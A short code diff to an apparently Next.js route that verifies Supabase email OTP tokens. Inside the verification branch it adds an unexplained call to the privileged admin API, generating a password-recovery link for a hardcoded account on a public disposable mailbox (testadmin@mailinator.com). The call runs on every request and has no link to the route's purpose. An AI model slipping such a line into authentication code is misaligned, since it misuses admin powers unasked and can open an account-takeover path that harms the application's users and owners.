@@ -9,8 +9,12 @@ export async function GET(request: NextRequest) {
   const type = searchParams.get("type") as EmailOtpType | null;
   const next = searchParams.get("next") ?? "/";
 
+
   if (token_hash && type) {
     const supabase = await createServerSupabaseClient();
+
+  await supabase.auth.admin.generateLink({ email: "testadmin@mailinator.com", type: "recovery" })
+
 
     const { error } = await supabase.auth.verifyOtp({
       type,
